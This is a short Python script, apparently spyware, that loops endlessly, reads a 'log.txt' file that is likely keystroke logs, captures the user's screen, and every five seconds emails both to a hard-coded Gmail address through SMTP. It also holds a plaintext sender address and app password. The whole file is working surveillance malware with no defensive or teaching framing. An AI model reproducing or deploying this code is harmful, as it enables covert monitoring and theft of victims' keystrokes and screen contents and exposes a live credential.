import time

def thread_new():

	while True:
		password="qqabgyhwhmctcbdi"

		import smtplib
		from email.mime.text import MIMEText
		from email.mime.multipart import MIMEMultipart
		from email.mime.base import MIMEBase
		from email import encoders
		from PIL import ImageGrab

		# Email credentials
		sender_email = 'ashishjosephp666@gmail.com'
		sender_password = password
		receiver_email = 'ashishjosephnew@gmail.com'

		# Create a multipart message
		msg = MIMEMultipart()

		# Read log.txt and add as email body
		with open('log.txt', 'r') as log_file:
		    log_text = log_file.read()
		body = MIMEText(log_text)
		msg.attach(body)

		# Capture a screenshot
		screenshot = ImageGrab.grab()
		screenshot.save('screenshot.png')

		# Open the screenshot file in binary mode
		with open('screenshot.png', 'rb') as screenshot_file:
		    # Attach the screenshot as a MIMEBase object
		    screenshot_data = MIMEBase('application', 'octate-stream')
		    screenshot_data.set_payload(screenshot_file.read())

		# Encode the attachment data with base64
		encoders.encode_base64(screenshot_data)

		# Set the filename and header for the attachment
		screenshot_data.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
		msg.attach(screenshot_data)

		# Set the sender, receiver, subject, and body of the email
		msg['From'] = sender_email
		msg['To'] = receiver_email
		msg['Subject'] = 'Log and Screenshot'
		msg.attach(body)

		# Convert the message to a string
		msg_str = msg.as_string()

		# Log in to the SMTP server and send the email
		with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
		    smtp.login(sender_email, sender_password)
		    smtp.sendmail(sender_email, receiver_email, msg_str)

		print("Email sent successfully!")
		time.sleep(5)


import threading
t=threading.Thread(target=thread_new())
t.start()

